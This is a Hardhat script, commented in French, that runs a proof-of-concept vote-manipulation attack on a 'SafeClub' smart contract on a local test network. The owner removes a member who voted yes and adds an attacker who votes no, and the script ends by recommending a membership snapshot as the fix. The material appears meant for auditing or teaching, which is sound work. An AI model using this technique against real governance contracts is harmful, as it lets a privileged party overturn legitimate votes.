import pkg from 'hardhat';
const { ethers } = pkg;

async function main() {
    const [owner, member1, member2, attacker] = await ethers.getSigners();
    const CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
    const contract = await ethers.getContractAt("SafeClub", CONTRACT_ADDRESS);
    
    console.log("==========================================");
    console.log("🚨 DÉMONSTRATION COMPLÈTE : MANIPULATION DE VOTE");
    console.log("==========================================");
    
    // Vérifier que le contrat a des fonds
    const balance = await contract.getBalance();
    if (balance < ethers.parseEther("1")) {
        console.log("⚠️  Le contrat n'a pas assez de fonds.");
        console.log("💡 Financez d'abord : npx hardhat run scripts/fund-contract.js --network localhost");
        return;
    }
    
    console.log("\n📊 ÉTAPE 1 : Création d'une proposition");
    console.log("==========================================");
    
    // Créer une proposition avec durée de 5 minutes pour avoir le temps
    const duration = 5 * 60; // 5 minutes
    await contract.connect(member1).createProposal(
        owner.address,
        ethers.parseEther("0.5"),
        "Proposition de test pour démonstration d'attaque",
        duration
    );
    
    const proposalCount = await contract.nextProposalId();
    const proposalId = proposalCount - 1n;
    console.log(`✅ Proposition créée : ID #${proposalId}`);
    
    console.log("\n📊 ÉTAPE 2 : Votes initiaux");
    console.log("==========================================");
    
    // Vérifier que member1 et member2 sont membres
    const isMember1 = await contract.isMember(member1.address);
    const isMember2 = await contract.isMember(member2.address);
    
    if (!isMember1) {
        console.log("Ajout de member1...");
        await contract.addMember(member1.address);
    }
    if (!isMember2) {
        console.log("Ajout de member2...");
        await contract.addMember(member2.address);
    }
    
    // Voter OUI avec les deux membres
    console.log("Member1 vote OUI...");
    await contract.connect(member1).vote(proposalId, true);
    
    console.log("Member2 vote OUI...");
    await contract.connect(member2).vote(proposalId, true);
    
    const proposalBefore = await contract.getProposal(proposalId);
    console.log(`\n📊 État après votes initiaux :`);
    console.log(`  Votes OUI : ${proposalBefore.yesVotes}`);
    console.log(`  Votes NON : ${proposalBefore.noVotes}`);
    console.log(`  Majorité : ${proposalBefore.yesVotes > proposalBefore.noVotes ? '✅ OUI (Approuvée)' : '❌ NON (Rejetée)'}`);
    
    const quorum = await contract.quorum();
    console.log(`  Quorum requis : ${quorum}`);
    console.log(`  Quorum atteint : ${proposalBefore.yesVotes >= quorum ? '✅ OUI' : '❌ NON'}`);
    
    console.log("\n==========================================");
    console.log("🚨 ATTAQUE : Manipulation de vote");
    console.log("==========================================");
    
    // Étape 1 : Retirer member2 qui a voté OUI
    console.log("\n1️⃣  Étape 1 : Owner retire member2 (qui a voté OUI)");
    try {
        await contract.removeMember(member2.address);
        console.log("   ✅ member2 retiré avec succès");
    } catch (error) {
        console.log("   ⚠️  Erreur :", error.message);
    }
    
    // Étape 2 : Ajouter un nouveau membre (attaquant)
    console.log("\n2️⃣  Étape 2 : Owner ajoute un nouveau membre (attaquant)");
    try {
        const isAttackerMember = await contract.isMember(attacker.address);
        if (!isAttackerMember) {
            await contract.addMember(attacker.address);
            console.log("   ✅ Attaquant ajouté comme membre");
        } else {
            console.log("   ⚠️  Attaquant déjà membre");
        }
    } catch (error) {
        console.log("   ⚠️  Erreur :", error.message);
    }
    
    // Étape 3 : Attaquant vote NON
    console.log("\n3️⃣  Étape 3 : Attaquant vote NON");
    try {
        const hasVoted = await contract.hasVoted(proposalId, attacker.address);
        if (!hasVoted) {
            await contract.connect(attacker).vote(proposalId, false);
            console.log("   ✅ Vote NON enregistré par l'attaquant");
        } else {
            console.log("   ⚠️  Attaquant a déjà voté");
        }
    } catch (error) {
        console.log("   ⚠️  Erreur :", error.message);
    }
    
    console.log("\n📊 ÉTAT APRÈS ATTAQUE :");
    console.log("==========================================");
    const proposalAfter = await contract.getProposal(proposalId);
    console.log(`  Votes OUI : ${proposalAfter.yesVotes}`);
    console.log(`  Votes NON : ${proposalAfter.noVotes}`);
    console.log(`  Majorité : ${proposalAfter.yesVotes > proposalAfter.noVotes ? '✅ OUI (Approuvée)' : '❌ NON (Rejetée)'}`);
    
    console.log("\n==========================================");
    console.log("⚠️  ANALYSE DE L'ATTAQUE :");
    console.log("==========================================");
    console.log("AVANT l'attaque :");
    console.log(`  - 2 votes OUI, 0 vote NON`);
    console.log(`  - Majorité : OUI ✅`);
    console.log(`  - Proposition approuvée`);
    
    console.log("\nAPRÈS l'attaque :");
    console.log(`  - ${proposalAfter.yesVotes} vote(s) OUI, ${proposalAfter.noVotes} vote(s) NON`);
    console.log(`  - Majorité : ${proposalAfter.yesVotes > proposalAfter.noVotes ? 'OUI ✅' : 'NON ❌'}`);
    
    if (proposalAfter.yesVotes <= proposalAfter.noVotes) {
        console.log("\n🚨 ATTAQUE RÉUSSIE !");
        console.log("   La proposition est maintenant rejetée alors qu'elle était approuvée.");
    } else {
        console.log("\n⚠️  ATTENTION :");
        console.log("   Les votes OUI restent enregistrés même si le membre est retiré.");
        console.log("   C'est une vulnérabilité : les votes ne devraient pas compter si le membre est retiré.");
    }
    
    console.log("\n💡 SOLUTION : Snapshot des membres au moment de création");
    console.log("   - Geler la liste des membres lors de la création de la proposition");
    console.log("   - Seuls les membres au moment de la création peuvent voter");
    console.log("   - Empêcher l'ajout/retrait de membres pendant le vote actif");
    console.log("==========================================");
}

main().catch((error) => {
    console.error("Erreur :", error);
    process.exitCode = 1;
});
